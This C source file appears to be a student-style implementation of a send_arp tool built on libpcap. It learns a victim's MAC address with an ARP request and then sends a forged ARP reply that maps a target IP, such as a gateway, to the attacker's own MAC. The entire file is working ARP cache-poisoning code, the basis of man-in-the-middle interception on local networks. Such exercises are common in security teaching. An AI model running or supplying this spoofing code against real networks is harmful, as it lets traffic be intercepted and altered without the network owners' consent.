#include "arp.h"

void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	u_char packet[50];
	uint8_t my_mac[6], 
		send_mac[6],
		mac_ff[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		mac_00[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};			
	uint8_t my_ip[4];
	uint32_t send_ip_l = inet_addr(argv[2]),
		tar_ip_l = inet_addr(argv[3]);
	uint8_t *send_ip = (uint8_t*)&send_ip_l,
		*tar_ip = (uint8_t*)&tar_ip_l;
	struct pcap_pkthdr *header;
	const u_char *pkt;

  	char *dev = argv[1];
  	char errbuf[PCAP_ERRBUF_SIZE];
  	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    	return -1;
  	}


	get_my_mac(my_mac);
	get_my_ip(my_ip, argv[1]);
	make_arp(packet, my_mac, mac_ff, ARP_REQUEST,
			 my_mac, my_ip, mac_00, send_ip);
	pcap_sendpacket(handle, packet, PACKET_SIZE);

	while (true) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		if(get_sender_mac(pkt, send_mac, send_ip))
			break;
	}
	
	make_arp(packet, my_mac, send_mac, ARP_REPLY,
			 my_mac, tar_ip, send_mac, send_ip);
	pcap_sendpacket(handle, packet, PACKET_SIZE);
}
